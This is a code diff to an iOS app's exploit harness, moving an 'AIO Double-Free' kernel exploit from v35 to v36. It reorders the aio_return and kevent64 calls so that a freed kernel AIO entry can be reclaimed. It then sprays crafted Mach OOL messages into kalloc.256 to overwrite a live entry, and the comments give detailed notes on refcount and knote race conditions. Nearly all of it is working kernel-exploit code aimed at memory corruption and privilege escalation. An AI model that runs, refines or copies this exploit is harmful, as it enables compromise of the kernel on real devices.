@@ -269,7 +269,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     while (!atomic_load_explicit(&s->start, memory_order_acquire));
     while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
         if (aio_error(s->trigger) == 0) {
-            // v35: Detection only — no aio_return (v34 crash: racer's aio_return
+            // v36: Detection only — no aio_return (v34 crash: racer's aio_return
             // raced with worker's aio_entry_unref, refcount went 2→1 instead of
             // 1→0 → no zfree → knote's kn_hook pointed to unfreed slot → if
             // kevent64 runs before worker's zfree → dangling kn_hook → crash).
@@ -356,7 +356,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Double-Free v35" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v36" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5742,7 +5742,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Double-Free v35 =========="];
+    [self appendLog:@"\n========== AIO Double-Free v36 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5761,7 +5761,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v35" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v36" forState:UIControlStateNormal];
         });
         return;
     }
@@ -5773,18 +5773,19 @@ static void *e2_free_and_ool_racer(void *arg) {
     write(fd, fdata, sizeof(fdata));
     [self appendLog:[NSString stringWithFormat:@"fd=%d file=32KB pid=%d uid=%d", fd, getpid(), getuid()]];
 
-    // v35: Racer detects tcb completion only (no aio_return — avoids the
-    // v34 race: racer's aio_return vs worker's aio_entry_unref causing
-    // refcount 2→1 instead of 1→0). Main thread calls aio_return(&tcb)
-    // AFTER kevent64 (knote consumed, no dangling kn_hook). By then worker
-    // definitely called aio_entry_unref → refcount 1→0 → zfree safe.
-    // Then aio_read(&rcbs[0]) reclaims slot S via LIFO → live entry.
+    // v36: aio_return(&tcb) BEFORE kevent64 (v27/v28 proven-safe pattern).
+    // Racer detects tcb completion (aio_error==0). Main thread immediately
+    // calls aio_return(&tcb) → refcount 1→0 → zfree → slot S on freelist.
+    // Then aio_read(&rcbs[0]) reclaims slot S via LIFO → NEW valid entry
+    // with valid procp. THEN kevent64 processes cached knote — kn_hook
+    // points to slot S which now has rcbs[0]'s valid entry. filt_aioprocess
+    // cached-event path skips TAILQ_REMOVE → safe (v18/v27/v28 empirical proof).
+    // No dangling kn_hook at any point.
     //
-    // Then OOL spray with &rcbs[0] at all offsets. If freelist has a duplicate
-    // of slot S, OOL reclaims it → overwrites LIVE rcbs[0] entry →
-    // aio_error(&rcbs[0]) returns 0xDEAD0001 → aio_return with crafted TAILQ.
+    // v35 proved the inverse (kevent64 FIRST, aio_return AFTER) fails because
+    // kevent64 consumes the entry from the process table → aio_return EINVAL.
     //
-    // Phase A: tcb(SIGEV_KEVENT) + racer(detect) → kevent64 → aio_return → aio_read
+    // Phase A: tcb(SIGEV_KEVENT) + racer(detect) → aio_return → aio_read → kevent64
     // Phase B: OOL payload (&rcbs[0] spray 0x00-0xF8, markers at 0x28/0x30)
     // Phase C: OOL spray → check aio_error(&rcbs[0]) for overlap → aio_return if hit
     // Phase D: Health check
@@ -5795,12 +5796,11 @@ static void *e2_free_and_ool_racer(void *arg) {
     static char tbuf[4096];
     static char rbufs[AIO_NRECLAIM][8192];
 
-    // ---- Phase A v35: tcb + racer(detect) → kevent64 → aio_return + aio_read ----
-    // v35: Racer only detects completion. Main thread calls aio_return(&tcb)
-    // AFTER kevent64 (knote consumed, no dangling reference). By then worker
-    // has definitely called aio_entry_unref → refcount 1→0 → zfree is safe.
-    // Then aio_read(&rcbs[0]) reclaims slot S via LIFO (same CPU).
-    [self appendLog:@"\n--- Phase A v35: detect → kevent64 → aio_return → aio_read reclaim ---"];
+    // ---- Phase A v36: tcb + racer(detect) → aio_return → aio_read → kevent64 ----
+    // v36: aio_return BEFORE kevent64. Racer only detects completion.
+    // Main thread frees tcb entry while still in process table, reclaims
+    // slot S with aio_read (LIFO, same CPU), THEN kevent64 on cached knote.
+    [self appendLog:@"\n--- Phase A v36: detect → aio_return → aio_read → kevent64 ---"];
 
     for (int attempt = 0; attempt < 5; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"  attempt %d/5", attempt + 1]];
@@ -5820,7 +5820,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
         tcb.aio_sigevent.sigev_signo = kq;
 
-        // v35 racer: detection only, NO aio_return (avoids worker race crash)
+        // v36 racer: detection only, NO aio_return (same as v35)
         struct aio_race_state rs = {};
         rs.trigger = &tcb;
         rs.rcbs = NULL;
@@ -5847,7 +5847,35 @@ static void *e2_free_and_ool_racer(void *arg) {
         }
         [self appendLog:[NSString stringWithFormat:@"  racer detected completion (freed=%d)", freed]];
 
-        // kevent64 FIRST (knote still has valid procp in kn_hook → slot is live)
+        // v36: aio_return(&tcb) BEFORE kevent64 — entry is still in process table
+        // (racer just confirmed aio_error==0). refcount 1→0 → zfree → slot S freed.
+        aio_set_thread_affinity(42);
+        ssize_t tcb_ret = aio_return(&tcb);
+        [self appendLog:[NSString stringWithFormat:@"  aio_return(tcb)=%zd %s",
+            tcb_ret, tcb_ret == -1 ? "(EINVAL — worker freed first, slot S on freelist)" : "(zfree by us)"]];
+        // Even if EINVAL (worker already freed), slot S is on some freelist.
+        // aio_read on CPU 42 tries to reclaim it via LIFO/depot.
+
+        // Immediately reclaim slot S via aio_read on same CPU (LIFO)
+        memset(&rcbs[0], 0, sizeof(rcbs[0]));
+        rcbs[0].aio_fildes = fd;
+        rcbs[0].aio_buf = rbufs[0];
+        rcbs[0].aio_nbytes = 1;
+        rcbs[0].aio_offset = 0x10000;
+        rcbs[0].aio_lio_opcode = LIO_READ;
+        rcbs[0].aio_sigevent.sigev_notify = SIGEV_NONE;
+
+        int r0 = aio_read(&rcbs[0]);
+        [self appendLog:[NSString stringWithFormat:@"  aio_read(rcbs[0])=%d (reclaim slot S)", r0]];
+        if (r0 != 0) {
+            [self appendLog:[NSString stringWithFormat:@"  aio_read failed errno=%d — slot S stolen", errno]];
+            close(kq);
+            goto cleanup;
+        }
+
+        // NOW kevent64 — slot S has rcbs[0]'s VALID entry (procp valid, in process table).
+        // knote was activated by tcb's I/O completion. kn_hook → slot S → rcbs[0]'s entry.
+        // filt_aioprocess cached-event path skips TAILQ_REMOVE → safe.
         struct kevent64_s kev = {};
         int nev = kevent64(kq, NULL, 0, &kev, 1, 0, NULL);
         [self appendLog:[NSString stringWithFormat:@"  kevent64(timeout=0)=%d", nev]];
@@ -5874,28 +5902,6 @@ static void *e2_free_and_ool_racer(void *arg) {
             [self appendLog:[NSString stringWithFormat:@"  leaking kq=%d (knote unconsumed)", kq]];
         }
 
-        // NOW free &tcb and reclaim: worker definitely called aio_entry_unref
-        // (aio_error==0 detected). refcount is 1 → aio_return → 0 → zfree.
-        aio_set_thread_affinity(42);
-        ssize_t tcb_ret = aio_return(&tcb);
-        [self appendLog:[NSString stringWithFormat:@"  aio_return(tcb)=%zd (main thread, after kevent64)", tcb_ret]];
-
-        // Immediately reclaim slot S via aio_read on same CPU (LIFO)
-        memset(&rcbs[0], 0, sizeof(rcbs[0]));
-        rcbs[0].aio_fildes = fd;
-        rcbs[0].aio_buf = rbufs[0];
-        rcbs[0].aio_nbytes = 1;
-        rcbs[0].aio_offset = 0x10000;
-        rcbs[0].aio_lio_opcode = LIO_READ;
-        rcbs[0].aio_sigevent.sigev_notify = SIGEV_NONE;
-
-        int r0 = aio_read(&rcbs[0]);
-        [self appendLog:[NSString stringWithFormat:@"  aio_read(rcbs[0])=%d (reclaim slot S)", r0]];
-        if (r0 != 0) {
-            [self appendLog:[NSString stringWithFormat:@"  aio_read failed errno=%d — slot S stolen", errno]];
-            goto cleanup;
-        }
-
         break;
     }
 
@@ -5904,18 +5910,18 @@ static void *e2_free_and_ool_racer(void *arg) {
         goto cleanup;
     }
 
-    // rcbs[0]'s entry is now LIVE at slot S (reclaimed via main-thread aio_read
-    // after aio_return freed tcb's entry). Process table maps &rcbs[0] → slot S.
+    // rcbs[0]'s entry is now LIVE at slot S (reclaimed via aio_read after
+    // aio_return freed tcb's entry). Process table maps &rcbs[0] → slot S.
     // rcbs[0] has SIGEV_NONE → no kq/knote complexity.
     // Wait for rcbs[0] to complete (worker does I/O, calls aio_entry_unref 2→1).
     while (aio_error(&rcbs[0]) == EINPROGRESS) usleep(500);
     int rcbs0_err = aio_error(&rcbs[0]);
     [self appendLog:[NSString stringWithFormat:@"  aio_error(rcbs[0])=%d (0=completed, LIVE at slot S, refcount=1)", rcbs0_err]];
 
-    // ---- Phase B v35: OOL payload with &rcbs[0] spray ----
+    // ---- Phase B v36: OOL payload with &rcbs[0] spray ----
     // rcbs[0]'s entry is at slot S. We spray &rcbs[0] at all offsets so
     // aiocbp match succeeds when aio_return walks doneq.
-    [self appendLog:@"\n--- Phase B v35: OOL payload (&rcbs[0] spray) ---"];
+    [self appendLog:@"\n--- Phase B v36: OOL payload (&rcbs[0] spray) ---"];
 
     enum { kOolV35Size = 256 };
     uint8_t *oolPayload = (uint8_t *)calloc(1, kOolV35Size);
@@ -5959,13 +5965,13 @@ static void *e2_free_and_ool_racer(void *arg) {
         mach_msg_ool_descriptor_t ool;
     } OolV35Msg;
 
-    // ---- Phase C v35: Passive OOL overlap on LIVE rcbs[0] entry ----
+    // ---- Phase C v36: Passive OOL overlap on LIVE rcbs[0] entry ----
     // rcbs[0]'s entry is LIVE at slot S (in process table, on doneq).
     // OOL send → kalloc.256 from CPU 42's magazine. If slot S is on freelist
     // (duplicate from corruption), OOL reclaims it → overwrites LIVE entry.
     // We detect overlap via aio_error(&rcbs[0]) — if errorval changes from 0
     // to 0xDEAD0001, the OOL payload overwrote the entry!
-    [self appendLog:@"\n--- Phase C v35: Passive OOL overlap (rcbs[0] live) ---"];
+    [self appendLog:@"\n--- Phase C v36: Passive OOL overlap (rcbs[0] live) ---"];
 
     if (ovSend == MACH_PORT_NULL) {
         [self appendLog:@"FAIL: no OOL send port"];
@@ -6029,8 +6035,8 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:[NSString stringWithFormat:@"  aio_return(rcbs[0])=%zd (cleanup)", cleanRet]];
     }
 
-    // ---- Phase D v35: Health check ----
-    [self appendLog:@"\n--- Phase D v35: Health check ---"];
+    // ---- Phase D v36: Health check ----
+    [self appendLog:@"\n--- Phase D v36: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6060,11 +6066,11 @@ cleanup:
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO Double-Free v35 Complete =========="];
+    [self appendLog:@"========== AIO Double-Free v36 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Double-Free v35" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v36" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
